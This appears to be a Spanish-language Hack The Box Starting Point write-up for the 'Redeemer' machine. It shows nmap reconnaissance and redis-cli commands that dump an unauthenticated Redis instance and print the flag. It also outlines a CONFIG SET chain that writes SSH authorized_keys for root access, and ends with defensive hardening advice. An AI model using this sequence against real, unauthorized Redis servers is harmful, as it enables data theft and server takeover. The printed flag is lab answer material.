Resumen Ejecutivo

La máquina Redeemer expone Redis 5.0.7 en el puerto 6379 sin autenticación. Redis es una base de datos in-memory (en RAM) que almacena pares clave-valor. Al estar expuesta sin contraseña, cualquier persona puede conectarse y leer toda la información almacenada — incluyendo la flag. El ataque tomó 3 comandos y ~3 minutos, estableciendo el récord de eficiencia en el Starting Point Ghost-Ops. Adicionalmente, se documenta una ruta de escalada a RCE mediante escritura de archivos con CONFIG SET.

¿Qué es Redis y por qué está expuesto sin auth?

Redis (Remote Dictionary Server) es una base de datos in-memory extremadamente rápida usada para cache de sesiones web, colas de mensajes, rankings en tiempo real y rate limiting. Fue diseñado para operar en redes internas confiables — su documentación original decía "Redis está diseñado para ser accedido por clientes confiables".

⚠ ¿Por qué Redis sin autenticación es tan común?

  • Developers lo instalan para desarrollo local sin contraseña
  • Olvidan configurar requirepass en /etc/redis/redis.conf antes de producción
  • Asumen que la red interna es suficientemente segura (error clásico)
  • Resultado: millones de instancias Redis expuestas a Internet sin credenciales

Reconocimiento — Paso a Paso

Paso 1 — Reconocimiento

ping — Confirmar conectividad y detectar Linux por TTL

¿Por qué este comando?

Confirmar que la máquina está activa y obtener una primera pista del OS mediante el campo TTL del paquete ICMP, sin lanzar herramientas más invasivas.

ping -c2 10.129.18.210
ping → herramienta ICMP de diagnóstico de red
-c2 → enviar 2 paquetes y detenerse
10.129.18.210 → IP del objetivo en HTB VPN
Output
64 bytes from 10.129.18.210: icmp_seq=1 ttl=63 time=44.1 ms
64 bytes from 10.129.18.210: icmp_seq=2 ttl=63 time=44.3 ms
¿Qué nos dice este output?
  • ttl=63 → Linux confirmado (TTL inicial 64, menos 1 salto = 63)
  • 0% packet loss → conectividad perfecta con la VPN
Decisión tomada

Máquina Linux activa. Iniciamos descubrimiento de puertos.

Paso 2 — Reconocimiento

Nmap fase rápida — Puerto 6379 Redis

nmap -p- --open -n -T4 -sS 10.129.18.210
-p- → todos los 65535 puertos TCP
--open → solo puertos abiertos
-n → sin resolución DNS
-T4 → velocidad agresiva
-sS → SYN scan half-open (no completa el handshake TCP)
Output
PORT     STATE SERVICE
6379/tcp open  redis
¿Qué nos dice este output?
  • 1 puerto abierto: 6379/tcp → puerto estándar de Redis
  • Un solo servicio = un único vector de ataque
Decisión tomada

Redis en puerto estándar. Árbol de decisión: conectar sin autenticación con redis-cli. Fase profunda para confirmar versión.

Paso 3 — Reconocimiento

Nmap fase profunda — Confirmar Redis sin autenticación

¿Por qué esta fase confirma la vulnerabilidad?

El script NSE redis-info se conecta al servidor Redis y obtiene información del sistema. Si puede hacerlo sin credenciales, confirma que requirepass no está configurado — la vulnerabilidad principal.

nmap -p6379 -sC -sV -n 10.129.18.210
-p6379 → solo el puerto Redis
-sC → scripts NSE: redis-info se conecta y obtiene info del servidor sin auth
-sV → versión exacta del servicio
-n → sin DNS
Output
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

| redis-info:
|   Redis version: 5.0.7
|   OS: Linux 5.4.0-77-generic x86_64
|   Used memory: 859.12K
|   Connected clients: 1
|_  Role: master
¿Qué nos dice este output?
  • Redis 5.0.7 → versión de 2020, con varios CVEs conocidos
  • OS: Linux 5.4.0-77-generic → nmap obtuvo info del OS directamente de Redis sin autenticación
  • Connected clients: 1 → somos nosotros conectados por el script NSE
  • El script pudo obtener todo esto sin credenciales → sin autenticación confirmado
Decisión tomada

Redis sin auth confirmado. Procedemos directamente a la explotación con redis-cli.

Explotación — Paso a Paso

Paso 4 — Explotación

redis-cli PING — Verificar acceso sin autenticación

¿Qué es redis-cli y por qué enviamos PING?

redis-cli es el cliente oficial de Redis — permite enviar cualquier comando Redis como si fuéramos una aplicación legítima. El comando PING del protocolo Redis es el test de conectividad: si responde PONG, estamos conectados y sin autenticación requerida. Si hubiera contraseña, respondería: (error) NOAUTH Authentication required.

redis-cli -h 10.129.18.210 ping
redis-cli → cliente oficial de línea de comandos de Redis
-h 10.129.18.210 → (host) especifica la IP del servidor Redis remoto. Sin -h, redis-cli intenta conectar a localhost.
ping → comando Redis de test de conectividad. El servidor debe responder PONG.
Output
PONG
¿Qué nos dice PONG?
  • Conexión exitosa al servidor Redis
  • Sin autenticación requerida — si hubiera contraseña: (error) NOAUTH Authentication required.
  • Tenemos acceso completo al servidor como si fuéramos la aplicación legítima
Decisión tomada

Acceso sin auth confirmado. Listamos todas las claves con keys *.

Paso 5 — Explotación

keys * — Listar todas las claves en el keystore

¿Qué hace KEYS en Redis?

El comando KEYS pattern lista todas las claves almacenadas en la base de datos que coincidan con el patrón. El asterisco * significa "cualquier cadena" — nos da todas las claves sin filtro. En un Redis de producción real, aquí podríamos encontrar tokens de sesión, contraseñas hasheadas, datos de usuarios, API keys.

redis-cli -h 10.129.18.210 keys '*'
redis-cli -h 10.129.18.210 → cliente Redis conectado al servidor objetivo
keys → comando Redis para listar claves según patrón
'*' → wildcard que significa "todas las claves". Las comillas simples evitan que bash interprete * como glob de archivos locales.
Output
1) "numb"
2) "flag"
3) "temp"
4) "stor"
¿Qué nos dice este output?
  • 4 claves almacenadas en la base de datos Redis
  • "flag" → ¡nuestro objetivo exacto!
  • Las otras claves (numb, temp, stor) pueden contener datos adicionales — siempre hacer dump completo
Decisión tomada

Clave flag localizada. La obtenemos con GET.

Paso 6 — Flag

get flag — Obtener el valor de la clave

¿Qué hace GET en Redis?

GET key recupera el valor almacenado bajo una clave específica. Es el comando de lectura más básico de Redis. En una base de datos sin autenticación, podemos leer el valor de cualquier clave con este simple comando.

redis-cli -h 10.129.18.210 get flag
redis-cli -h 10.129.18.210 → cliente Redis en el servidor objetivo
get → comando Redis para leer el valor de una clave
flag → nombre exacto de la clave que queremos leer
Output
"03e1d2b376c37ab3f5319922053953eb"
¿Qué nos dice este output?
  • La flag es el valor almacenado bajo la clave "flag" en Redis
  • Hash MD5 de 32 caracteres hexadecimales — formato estándar de HTB
  • En 1 solo comando obtuvimos el dato más sensible del servidor

Técnica Avanzada — De Data Exposure a RCE

Redis permite cambiar su directorio de trabajo y nombre del archivo de dump en tiempo real. Esto crea una ruta de escritura de archivos arbitrarios sin necesitar ninguna otra vulnerabilidad:

CONFIG SET dir /root/.ssh → CONFIG SET dbfilename authorized_keys → SET ssh_key "[clave pública]" → SAVE → ssh root@10.129.18.210 ← sin contraseña

Esta máquina no requirió este nivel de explotación, pero en entornos reales Redis sin auth + esta técnica otorga shell completa como root.

Lecciones Aprendidas

⚔ Para el Atacante

  • Puerto 6379 abierto → siempre probar redis-cli -h IP ping
  • PONG sin error → sin autenticación → acceso total
  • Secuencia: ping → keys * → get → mget → config get *
  • CONFIG SET → escritura de archivos → RCE (SSH keys, cron)
  • INFO server revela OS, versión, directorio

🛡 Para el Defensor

  • Autenticación: requirepass TuContraseña en redis.conf
  • Bind local: bind 127.0.0.1 — solo conexiones locales
  • Firewall: DROP en puerto 6379 desde IPs externas
  • Renombrar: rename-command CONFIG "" — deshabilita CONFIG
  • Habilitar TLS (Redis 6+) para cifrar el tráfico
